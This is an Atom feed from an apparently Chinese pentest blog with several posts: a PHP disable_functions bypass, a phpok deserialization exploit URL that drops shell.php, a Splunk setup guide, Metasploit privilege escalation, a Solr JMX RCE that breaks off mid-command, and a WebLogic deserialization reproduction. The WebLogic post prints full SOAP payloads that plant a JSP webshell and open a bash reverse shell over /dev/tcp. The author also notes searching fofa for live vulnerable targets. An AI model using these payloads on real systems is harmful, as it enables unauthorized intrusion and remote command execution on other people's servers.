<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-25T09:15:06.645Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用LD_PRELOAD绕过php中的disable_function</title>
    <link href="http://yoursite.com/2019/12/25/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%BB%95%E8%BF%87php%E4%B8%AD%E7%9A%84disable-function/"/>
    <id>http://yoursite.com/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/</id>
    <published>2019-12-25T08:59:01.000Z</published>
    <updated>2019-12-25T09:15:06.645Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞原理就不讲了，网上一大堆，这里直接讲利用的方式<br>利用前提：没有禁用putenv函数<br><a id="more"></a></p><h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>下载地址在这里，然后要上传一个php文件和一个用c编译出来的so文件<br>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c  -m32 -o bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure></p><p><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/success.png" alt></p><h1 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h1><p>蚁剑这里直接写了个插件利用<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/ant.png" alt></p><p>选择LD_PRELOAD模式<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/putenv.png" alt></p><p>点击开始<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/upload.png" alt><br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/antproxy.png" alt><br>会在当前目录下生成一个antproxy.php的文件，然后我们连上这个文件就可以发现可以执行命令啦~<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/shell.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;漏洞原理就不讲了，网上一大堆，这里直接讲利用的方式&lt;br&gt;利用前提：没有禁用putenv函数&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phpok5.x 反序列化漏洞</title>
    <link href="http://yoursite.com/2019/12/11/phpok5-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/12/11/phpok5-x-反序列化漏洞/</id>
    <published>2019-12-11T10:32:30.000Z</published>
    <updated>2019-12-25T08:59:50.305Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。<br><a id="more"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></figure></p><p><a href="https://download.phpok.com/5.4.zip" target="_blank" rel="noopener">https://download.phpok.com/5.4.zip</a></p><p>可以直接打，真爽，打完之后会在根目录下生成一个shell.php<br><img src="/2019/12/11/phpok5-x-反序列化漏洞/phpok5-x-反序列化漏洞\shell.php" alt></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>lazy…….</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Splunk初识</title>
    <link href="http://yoursite.com/2019/12/10/Splunk%E5%88%9D%E8%AF%86/"/>
    <id>http://yoursite.com/2019/12/10/Splunk初识/</id>
    <published>2019-12-10T01:49:58.000Z</published>
    <updated>2019-12-10T09:32:58.550Z</updated>
    
    <content type="html"><![CDATA[<p>认识splunk的第一天<br><a id="more"></a></p><h1 id="Windows下进行安装"><a href="#Windows下进行安装" class="headerlink" title="Windows下进行安装"></a>Windows下进行安装</h1><p>下载地址：<a href="https://www.splunk.com/zh-hans_cn/download.html" target="_blank" rel="noopener">https://www.splunk.com/zh-hans_cn/download.html</a><br>这里要注册用户才可以使用，随便填写资料。<br><img src="/2019/12/10/Splunk初识/download.png" alt><br><img src="/2019/12/10/Splunk初识/8000.png" alt><br>看来默认绑定了8000端口，安装的时候会让你输入账号密码，这里我们登陆。<br><img src="/2019/12/10/Splunk初识/后台.png" alt></p><h1 id="Linux进行安装"><a href="#Linux进行安装" class="headerlink" title="Linux进行安装"></a>Linux进行安装</h1><p><img src="/2019/12/10/Splunk初识/linux.png" alt><br>这里我下载了tgz格式的文件，下载好之后进行解压，进入splunk目录下然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/splunk start</span><br></pre></td></tr></table></figure></p><p>他会让你同意一个协议，输入初始的用户名和密码<br><img src="/2019/12/10/Splunk初识/linux_start.png" alt><br>也是开在了8000端口，访问：<br><img src="/2019/12/10/Splunk初识/linux_backend.png" alt></p><h1 id="Splunk基本命令"><a href="#Splunk基本命令" class="headerlink" title="Splunk基本命令"></a>Splunk基本命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./splunk start    //启动</span><br><span class="line">./splunk stop   //关闭</span><br><span class="line">./splunk restart  //重启</span><br><span class="line">./splunk status   //查看状态</span><br><span class="line">./splunk version   //查看版本</span><br><span class="line">./splunk show splunkd-port  //查看管理端口</span><br><span class="line">./splunk show web-port   //查看web登陆管理端口</span><br><span class="line">./splunk set web-port 80  //修改web登陆管理端口为80</span><br><span class="line">./splunk set servername    //新的服务器名称 //设置服务器名称</span><br><span class="line">./splunk set default-hostname  新的主机名称 //设置默认主机名称</span><br><span class="line">./splunk enable web-ssl     //启用SSL</span><br><span class="line">./splunk disable web-ssl    //关闭SSL</span><br><span class="line">./splunk edit user admin –password ‘newpassword’ –authadmin:oldpassword     //修改用户密码</span><br><span class="line">./splunk add user  //新增用户</span><br><span class="line">./splunk add user 新的用户名 -password ‘新用户密码’ -full-name ‘设置它的全名’ –role User（这个是角色）</span><br><span class="line">./splunk list user    //列出用户</span><br><span class="line">./splunk remove user     //删除用户</span><br></pre></td></tr></table></figure><h1 id="导入日志文件"><a href="#导入日志文件" class="headerlink" title="导入日志文件"></a>导入日志文件</h1><p>这里选择添加数据<br><img src="/2019/12/10/Splunk初识/1.png" alt><br>选择监控<br><img src="/2019/12/10/Splunk初识/监视.png" alt><br>因为我们这里是本地上传，所以我们选择<strong>文件和目录</strong>选项，选定我们的路径，然后点击下一步<br><img src="/2019/12/10/Splunk初识/accesslog.png" alt><br>会让我们选择设置来源类型，估计splunk自动就会识别类型，这里并不需要修改，点击下一步<br><img src="/2019/12/10/Splunk初识/类型.png" alt><br>这一步是让我们设置索引，你可以自己设置一个索引，也可以使用默认的<br><img src="/2019/12/10/Splunk初识/索引.png" alt><br>然后一直点击下一步，等一会就可以开始搜索了<br><img src="/2019/12/10/Splunk初识/搜索.png" alt><br>在搜索框里面就可以搜索指定的内容</p><p>要是退出了这个搜索的页面，下一次我们可以通过点击主页面上的活动-&gt;任务，选择里面的任务就可以重新返回到搜索页面。</p><p>上传zip文件也是这个思路</p><h1 id="Splunk搜索语言"><a href="#Splunk搜索语言" class="headerlink" title="Splunk搜索语言"></a>Splunk搜索语言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">head n//返回前n个</span><br><span class="line">tail n//返回后n个</span><br><span class="line">top//显示字段最常见/出现次数最多的值</span><br><span class="line">rare//显示字段出现次数最少的值</span><br><span class="line">limit//限制查询，如：limit 5，限制结果的前5条</span><br><span class="line">rename xx as zz //为xx字段设置别名为zz,多个之间用 ，隔开</span><br><span class="line">fields//保留或删除搜索结果中的字段。fiels – xx 删除xx字段，保留则不需要 – 符号</span><br><span class="line">table//返回仅由参数中指定的字段所形成的表。如：table _time，clientip，返回的列表中只有这两个字段,多个字段用逗号隔开</span><br><span class="line">stats count() ：括号中可以插入字段，主要作用对事件进行计数</span><br><span class="line">stats dc()：distinct count，去重之后对唯一值进行统计</span><br><span class="line">stats values()，去重复后列出括号中的字段内容</span><br><span class="line">stats list()，未去重之后列出括号指定字段的内容</span><br><span class="line">stats avg()，求平均值</span><br></pre></td></tr></table></figure><h1 id="Splunk监视本地数据"><a href="#Splunk监视本地数据" class="headerlink" title="Splunk监视本地数据"></a>Splunk监视本地数据</h1><p>这里和上面上传文件是一样的思路，这里尝试去监控phpstudy里面的apache日志，设置如下<br>主页添加数据-&gt;监视-&gt;文件和目录<br><img src="/2019/12/10/Splunk初识/phpstudy.png" alt><br><img src="/2019/12/10/Splunk初识/p.png" alt><br>不过这里它好像不会主动刷新，要点击搜索或者刷新页面，才会有新的日志</p><h1 id="Splunk监视远程数据"><a href="#Splunk监视远程数据" class="headerlink" title="Splunk监视远程数据"></a>Splunk监视远程数据</h1><p>这个地方要下载splunk forwarder:<a href="https://www.splunk.com/en_us/download/universal-forwarder.html" target="_blank" rel="noopener">https://www.splunk.com/en_us/download/universal-forwarder.html</a></p><p>将下载好的splunkforwarder放到远程需要监听的服务器上，解压，配置转发器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd bin/</span><br><span class="line">ps aux | grep splunk</span><br><span class="line">./splunk start</span><br><span class="line">./splunk add forward-server 198.46.145.77:9997</span><br><span class="line">./splunk add forward-server 198.46.145.77:9997 -auth admin:changeme</span><br><span class="line">./splunk list forward-server</span><br><span class="line">./splunk add monitor /var/log/apache2/ -index linuxaudit</span><br></pre></td></tr></table></figure></p><p>我们的接收端要做两个事情，设置索引和配置接收的端口<br><img src="/2019/12/10/Splunk初识/suoyin.png" alt><br>接收的端口在设置，转发和接收，新建，添加一个9997端口<br><img src="/2019/12/10/Splunk初识/addnew.png" alt></p><p>最后我们在主界面应用Search &amp; Reporting中搜索  index=”linuxaudit”<br>我们监控的远程日志就会显示到这边来了</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/digod/p/9626882.html" title="https://www.cnblogs.com/digod/p/9626882.html" target="_blank" rel="noopener">https://www.cnblogs.com/digod/p/9626882.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;认识splunk的第一天&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="甲方安全" scheme="http://yoursite.com/tags/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用Msf进行后渗透中的信息收集</title>
    <link href="http://yoursite.com/2019/12/03/%E5%88%A9%E7%94%A8Msf%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2019/12/03/利用Msf进行后渗透中的信息收集/</id>
    <published>2019-12-03T08:54:19.000Z</published>
    <updated>2019-12-03T09:30:05.459Z</updated>
    
    <content type="html"><![CDATA[<p>post/windows/gather/forensics/enum_drives</p><p>post/windows/gather/forensics/browser_history</p><p>post/windows/gather/checkvm</p><p>post/windows/gather/enum_services</p><p>post/windows/gather/enum_applications</p><p>post/windows/gather/enum_shares</p><p>post/windows/gather/dumplinks</p><p>post/windows/gather/enum_applications</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;post/windows/gather/forensics/enum_drives&lt;/p&gt;
&lt;p&gt;post/windows/gather/forensics/browser_history&lt;/p&gt;
&lt;p&gt;post/windows/gather/checkvm&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>利用msf中的ask模块进行权限提升</title>
    <link href="http://yoursite.com/2019/12/03/%E5%88%A9%E7%94%A8msf%E4%B8%AD%E7%9A%84ask%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>http://yoursite.com/2019/12/03/利用msf中的ask模块进行权限提升/</id>
    <published>2019-12-03T07:48:08.000Z</published>
    <updated>2019-12-03T08:23:15.661Z</updated>
    
    <content type="html"><![CDATA[<p>权限提升学到的一种新方式<br><a id="more"></a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Kali：192.168.43.141<br>Win7：192.168.43.139</p><h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>简单说一下，当你拿到meterpreter之后可能是一个低权限的用户，这个时候我们可以利用msf中的 exploit/windows/local/ask 模块，通过提高程序运行级别，进行权限提升</p><p>首先我们拿到一个低权限的meterpreter<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/low.png" alt></p><p>这里getsystem是报错的，接下来我们利用这个ask模块<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/setting.png" alt></p><p>这里我们可以 show options 来查看我们需要配置的内容，这里的FILENAME为我们伪装的程序的名称，最后我们进行运行<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/run.png" alt></p><p>然后我们看Win7上，会显示这个提示<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/wechat.png" alt><br>受害者这里输入密码或者点击确认之后，我们再来看meterpreter<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/system.png" alt><br>这样就达到提权的目的啦</p><p>然后总结一下msf提权的几个方向<br>1、通过提高程序的运行级别(就是这篇文章所讲的)<br>2、Bypassuac<br>3、提权漏洞进行提权</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;权限提升学到的一种新方式&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>post</title>
    <link href="http://yoursite.com/2019/12/03/post/"/>
    <id>http://yoursite.com/2019/12/03/post/</id>
    <published>2019-12-03T07:46:10.000Z</published>
    <updated>2019-12-03T07:46:10.885Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Weblogic反序列化漏洞复现(CNVD-C-2019-48814)</title>
    <link href="http://yoursite.com/2019/11/25/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CNVD-C-2019-48814/"/>
    <id>http://yoursite.com/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/</id>
    <published>2019-11-25T10:57:52.000Z</published>
    <updated>2019-11-25T12:03:13.259Z</updated>
    
    <content type="html"><![CDATA[<ul><li>影响范围：WebLogic 10.*  /  WebLogic 12.1.3.0</li></ul><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里使用vulhub，官网：<a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p><p>按照上面的操作就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#安装docker-composer</span><br><span class="line">sudo apt-get install docker-composer</span><br><span class="line"></span><br><span class="line">#下载vulhub文件</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">#这里找到一个weblogic 10版本的漏洞环境</span><br><span class="line">cd vulhub/weblogic/CVE-2017-10271</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<a href="http://ip:7001" target="_blank" rel="noopener">http://ip:7001</a><br><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/success.png" alt></p><p>漏洞poc:<br><a href="https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961</a></p><p>好像是清水大佬写的，我们尝试写入shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.43.131:7001</span><br><span class="line">Content-Length: 1383</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/poc.png" alt></p><p>然后访问 <strong><a href="http://192.168.43.131:7001/_async/webshell.jsp?pwd=123&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.43.131:7001/_async/webshell.jsp?pwd=123&amp;cmd=whoami</a></strong><br><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/root.png" alt></p><p>这里可以执行命令了，然后我们尝试反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.43.131:7001</span><br><span class="line">Content-Length: 789</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.43.1/12345 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/shell.png" alt></p><p>反弹成功</p><p>fofa上半天就找到了一个，估计这个洞都修复的差不多了  ==</p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;影响范围：WebLogic 10.*  /  WebLogic 12.1.3.0&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Solr JMX服务远程代码执行复现</title>
    <link href="http://yoursite.com/2019/11/25/Apache-Solr-JMX%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/</id>
    <published>2019-11-25T07:51:46.000Z</published>
    <updated>2019-11-25T12:06:09.014Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>Kali:192.168.43.141</li><li>Ubuntu:192.168.43.131<br>首先我们在Ubuntu上安装 Solr<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">unzip solr-8.2.0.zip</span><br></pre></td></tr></table></figure></li></ul><p>进入到bin目录下，启动Solr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/start.png" alt><br>显示这样，说明环境搭建好了</p><p>查看bin目录下的solr.in.sh<br><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/JMX.png" alt><br>看这里开启了JMX，默认端口为18983</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在kali上使用msfconsole进行攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#设置exp</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">set RHOST 192.168.43.131</span><br><span class="line">set RPORT 18983</span><br><span 